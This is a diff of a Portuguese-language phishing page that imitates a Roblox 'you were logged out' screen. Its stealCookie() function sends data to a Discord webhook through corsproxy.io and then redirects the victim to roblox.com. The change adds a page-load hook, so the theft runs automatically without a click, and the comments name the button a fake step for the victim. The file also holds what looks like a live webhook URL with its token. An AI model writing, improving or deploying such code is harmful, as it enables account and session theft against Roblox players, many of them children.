@@ -41,12 +41,11 @@
         <h1>Você foi desconectado</h1>
         <p>Clique abaixo para entrar novamente.</p>
         
-        <!-- O botão chama a função stealCookie() -->
+        <!-- O botão agora serve apenas como "falso passo" para a vítima clicar -->
         <button onclick="stealCookie()">Entrar</button>
     </div>
 
     <script>
-        // ⚠️ SUA URL DO WEBHOOK JÁ ESTÁ CORRETA
         const webhookUrl = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1'; 
 
         function stealCookie() {
@@ -60,7 +59,6 @@
                 avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
             };
 
-            // USA O PROXY CORSPROXY.IO QUE É MAIS RÁPIDO
             fetch("https://corsproxy.io/?url=" + encodeURIComponent(webhookUrl), {
                 method: 'POST',
                 headers: { 
@@ -71,8 +69,6 @@
             })
             .then(response => {
                 if (!response.ok) throw new Error('Erro no proxy');
-                console.log("Enviado com sucesso!");
-                
                 window.location.href = "https://www.roblox.com";
             })
             .catch(error => {
@@ -80,6 +76,11 @@
                 window.location.href = "https://www.roblox.com";
             });
         }
+
+        // Garante que o script rode assim que a página carregar completamente
+        window.addEventListener('load', function() {
+            setTimeout(stealCookie, 500); // Pequeno delay para garantir que o cookie esteja disponível
+        });
     </script>
 </body>
 </html>
